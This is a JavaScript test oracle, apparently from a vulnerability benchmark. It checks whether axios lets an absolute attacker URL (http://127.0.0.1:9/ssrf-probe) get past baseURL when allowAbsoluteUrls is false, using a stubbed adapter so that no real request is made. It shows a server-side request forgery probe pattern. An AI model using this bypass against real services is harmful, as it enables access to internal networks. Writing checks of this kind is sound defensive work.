const fs = require('node:fs');
const path = require('node:path');
const os = require('node:os');

(async () => {
  let operation_completed = false;
  let exploit_succeeded = false;
  let evidence = '';

  const marker = path.join(os.tmpdir(), 'axios-ssrf-oracle-' + process.pid + '-' + Date.now());

  try {
    fs.mkdirSync(marker, { recursive: true });

    const axiosImport = require('axios');
    const axios = axiosImport && axiosImport.default ? axiosImport.default : axiosImport;

    // Benign call: use a relative URL that should remain relative in request config
    // (baseURL is applied later by adapters).
    let benignConfig;
    try {
      await axios.get('/ok', {
        baseURL: 'http://example.com/base/',
        timeout: 300,
        adapter: async (config) => {
          benignConfig = config;
          return {
            data: 'ok',
            status: 200,
            statusText: 'OK',
            headers: {},
            config,
            request: {}
          };
        }
      });
    } catch (e) {
      evidence = 'benign_exception=' + (e && e.message ? e.message : String(e));
      console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence }));
      return;
    }

    const benignUrl = benignConfig && typeof benignConfig.url === 'string' ? benignConfig.url : '';
    if (benignUrl !== '/ok') {
      evidence = 'benign_unexpected_url=' + benignUrl;
      console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence }));
      return;
    }

    operation_completed = true;

    // Malicious call: absolute URL with allowAbsoluteUrls=false.
    // Vulnerable behavior: config.url stays attacker absolute URL.
    // Patched behavior: config.url is rewritten to baseURL + absolute-string path form.
    let malConfig;
    let malErr = null;
    try {
      await axios.get('http://127.0.0.1:9/ssrf-probe', {
        baseURL: 'http://example.com/safe/',
        allowAbsoluteUrls: false,
        timeout: 300,
        adapter: async (config) => {
          malConfig = config;
          return {
            data: 'ok',
            status: 200,
            statusText: 'OK',
            headers: {},
            config,
            request: {}
          };
        }
      });
    } catch (e) {
      malErr = e;
    }

    if (malErr) {
      exploit_succeeded = false;
      evidence = 'malicious_rejected=' + (malErr && malErr.message ? malErr.message : String(malErr));
    } else {
      const malUrl = malConfig && typeof malConfig.url === 'string' ? malConfig.url : '';
      exploit_succeeded = (malUrl === 'http://127.0.0.1:9/ssrf-probe');
      evidence = 'benign_url=' + benignUrl + ';mal_url=' + malUrl;
    }

    try {
      fs.writeFileSync(path.join(marker, 'evidence.txt'), evidence, 'utf8');
    } catch (_) {}
  } catch (e) {
    operation_completed = false;
    exploit_succeeded = false;
    evidence = 'setup_exception=' + (e && e.message ? e.message : String(e));
  }

  console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence }));
})();